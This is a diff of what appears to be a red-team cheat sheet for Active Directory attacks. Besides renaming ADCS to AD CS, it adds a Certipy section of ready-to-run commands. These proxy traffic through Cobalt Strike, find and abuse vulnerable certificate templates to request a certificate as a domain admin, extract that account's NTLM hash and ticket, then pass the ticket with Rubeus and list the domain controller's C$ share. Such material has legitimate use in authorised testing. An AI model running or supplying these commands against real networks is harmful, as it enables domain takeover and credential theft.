@@ -364,12 +364,12 @@ execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfil
 ```
 
 ### Coercion attacks
-#### [PetitPotam](https://github.com/topotam/PetitPotam) - NTLM relay to ADCS
+#### [PetitPotam](https://github.com/topotam/PetitPotam) - NTLM relay to AD CS
 > PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions
-- Requires ADCS web server enrollment enabled
+- Requires AD CS web server enrollment enabled
 - Requries Kali running Impacket on target domain
 ```
-# Find ADCS web server and verify if web enrollment is enabled by browsing to the URL: `http://ADCS-server.domain.com/certsrv/`
+# Find AD CS web server and verify if web enrollment is enabled by browsing to the URL: `http://ADCS-server.domain.com/certsrv/`
 run certutil.exe
 
 # Start NTLM relay server on Kali 
@@ -479,7 +479,29 @@ execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTempl
 execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
 ```
 
-### [MalSCCM](https://github.com/nettitude/MalSCCM) - Exploiting SCCM servers to deploy malicious applications
+[Certipy - Python](https://github.com/ly4k/Certipy)<br />
+Use Python through a SOCKS proxy or a Linux VM on the domain to find and exploit misconfigured AD CS certs<br />
+```
+# First, start a SOCKS proxy in Cobalt Strike (or skip to the next step if you have an on-site Linux VM)
+socks <port>
+
+# Configure proxychains on Kali/Linux VM to proxy traffic through C2
+
+# Find vulnerable certs with Certipy through proxy
+proxychains certipy find -u 'my-user@domain.com' -p 'PASSWORD' -dc-ip 10.100.32.200 -vulnerable -timeout 30
+
+# Request a certificate for a vulnerable cert template through proxy
+proxychains certipy req -u 'my-user@domain.com' -p 'PASSWORD' -dc-ip 10.100.32.200 -ca corp-DC-CA -target ca.domain.com -template VulnTemplate -debug -upn 'DomainAdminAcc@domain.com'
+# Authenticate with the output .PFX cert file to reequset a TGT for the DomainAdminAcc user
+proxychains certipy auth -pfx DomainAdminAcc.pfx -username DomainAdminAcc -domain 'domain.com' -dc-ip X.X.X.X 
+--> Command will output NTLM hash of target account and the user's certificate
+
+# Use the output certificate of the DomainAdminAcc account with Rubeus
+execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminAcc /certificate:DomainAdminAcc.pfx /ptt /domain:domain.com /dc:DomainController.domain.com
+ls \\DomainController\c$ --> Verify command was successfully by doing an 'ls' cmd on the DC
+```
+
+### [MalSCCM](https://github.com/nettitude/MalSCCM) - Exploiting SCCM servers to deploy malicious applications<br />
 - Requires admin privileges on target SCCM server
 ```
 # Find the SCCM management servers
